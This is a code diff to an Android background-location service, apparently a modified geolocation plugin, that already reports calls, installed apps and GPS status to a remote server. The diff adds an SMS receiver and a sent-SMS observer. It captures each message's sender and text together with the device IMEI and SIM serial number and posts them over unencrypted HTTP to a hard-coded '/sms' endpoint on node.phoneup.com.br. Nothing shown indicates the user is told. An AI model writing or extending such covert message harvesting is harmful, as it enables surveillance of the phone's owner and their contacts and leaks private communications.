@@ -34,11 +34,13 @@ import android.os.Process;
 import androidx.annotation.Nullable;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 import android.location.LocationManager;
+import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.telephony.PhoneStateListener;
 import android.telephony.SignalStrength;
 import android.telephony.CellInfoGsm;
 import android.telephony.CellSignalStrengthGsm;
+import android.telephony.SmsMessage;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 
@@ -49,6 +51,7 @@ import com.marianhello.bgloc.sync.NotificationHelper;
 import com.marianhello.bgloc.PluginException;
 import com.marianhello.bgloc.PostLocationTask;
 import com.marianhello.bgloc.ResourceResolver;
+import com.marianhello.bgloc.SmsSentObservable;
 import com.marianhello.bgloc.data.BackgroundActivity;
 import com.marianhello.bgloc.data.BackgroundLocation;
 import com.marianhello.bgloc.data.ConfigurationDAO;
@@ -135,6 +138,7 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
     private PostLocationTask mPostLocationTask;
     private String mHeadlessTaskRunnerClass;
     private TaskRunner mHeadlessTaskRunner;
+    private SmsSentObservable smsSentObserver;
 
     private long mServiceId = -1;
     private static boolean sIsRunning = false;
@@ -146,12 +150,13 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
     private TelephonyManager tm;
     private LocationManager lm;
 
-    private SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+    public static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
 
     private int lastSignalLevel;
     private int lastBatteryLevel;
     private boolean lastLocationEnabled;
-    private String imei;
+    public static String imei;
+    public static String chip;
     private static int lastState = TelephonyManager.CALL_STATE_IDLE;
     private static String callStartTime;
     private static boolean isIncoming;
@@ -161,6 +166,8 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
     private static final String gpsStatusUrl = "http://node.phoneup.com.br:3333/gpsStatus";
     private static final String syncGpsStatusUrl = "http://node.phoneup.com.br:3333/syncStatus";
     private static final String packageUrl = "http://node.phoneup.com.br:3333/packages";
+    public static final String smsUrl = "http://node.phoneup.com.br:3333/sms";
+    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
     private Context gpsContext;
 
     private class ServiceHandler extends Handler {
@@ -259,23 +266,42 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
         tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
         lm = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
 
+        // Intents to get phone calls
         IntentFilter phoneCall = new IntentFilter();
         phoneCall.addAction(tm.ACTION_PHONE_STATE_CHANGED);
         phoneCall.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
 
+        // Intents to get packages change
         IntentFilter packagesFilter = new IntentFilter();
         packagesFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
         packagesFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
         packagesFilter.addAction(Intent.ACTION_PACKAGE_CHANGED);
         packagesFilter.addDataScheme("package");
 
+        // Intent to get if gps is enable or not
         IntentFilter locationEnabled = new IntentFilter();
         locationEnabled.addAction(lm.PROVIDERS_CHANGED_ACTION);
 
-        imei = tm.getDeviceId();
+        // Intent to detect SMS received
+        IntentFilter smsReceived = new IntentFilter();
+        smsReceived.addAction(SMS_RECEIVED);
 
+        // Get device IMEI
+        imei = tm.getDeviceId();
+        // Get SIM Card number
+        chip = tm.getSimSerialNumber();
+
+        // Signal strenght listener
         tm.listen(signalStrengthListener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
 
+        if (smsSentObserver == null) {
+            smsSentObserver = new SmsSentObservable(this);
+        }
+
+        this.getContentResolver().registerContentObserver(smsSentObserver.STATUS_URI, true, smsSentObserver);
+
+        // Receivers resgistered
+        registerReceiver(smsReceivedReceiver, smsReceived);
         registerReceiver(packagesReceiver, packagesFilter);
         registerReceiver(locationChangeReceiver, locationEnabled);
         registerReceiver(phoceCallReceiver, phoneCall);
@@ -310,6 +336,9 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
         unregisterReceiver(batteryChangeReceiver);
         unregisterReceiver(phoceCallReceiver);
         unregisterReceiver(locationChangeReceiver);
+        unregisterReceiver(packagesReceiver);
+        unregisterReceiver(smsReceivedReceiver);
+        this.getContentResolver().unregisterContentObserver(smsSentObserver);
 
         sIsRunning = false;
         super.onDestroy();
@@ -773,17 +802,46 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
         }
     };
 
+    private BroadcastReceiver smsReceivedReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            Bundle bundle = intent.getExtras();
+
+            Object[] pdus = (Object[]) bundle.get("pdus");
+
+            SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[0]);
+
+            logger.debug("[SMS RECEIVED] messages array: {}", messages);
+
+            String conteudo = messages.getMessageBody();
+            String adress = messages.getDisplayOriginatingAddress();
+
+            logger.debug("[SMS RECEIVED] Adress: {} Body: {}", adress, conteudo);
+
+            JSONObject sms = new JSONObject();
+
+            try {
+                sms.put("numero", adress);
+                sms.put("imei", imei);
+                sms.put("chip", chip);
+                sms.put("dhEvento", sdf.format(new Date()));
+                sms.put("conteudo", conteudo);
+                sms.put("tipo", "RECEBIDA");
+
+                postOnApi(smsUrl, sms);
+            } catch (Exception e) {
+                // TODO: handle exception
+            }
+
+        }
+    };
+
     private BroadcastReceiver packagesReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             Uri uri = intent.getData();
             String action = intent.getAction();
-
-            logger.debug("PACKGE action {}", action);
-
             String replacedAction = action.replace("android.intent.action.PACKAGE_", "");
-
-            logger.debug("PACKGE action {}", replacedAction);
 
             switch (replacedAction) {
             case "ADDED":
@@ -1002,7 +1060,6 @@ public class LocationServiceImpl extends Service implements ProviderDelegate, Lo
     private BroadcastReceiver phoceCallReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            String chip = tm.getSimSerialNumber();
 
             // We listen to two intents. The new outgoing call only tells us of an outgoing
             // call. We use it to get the number.
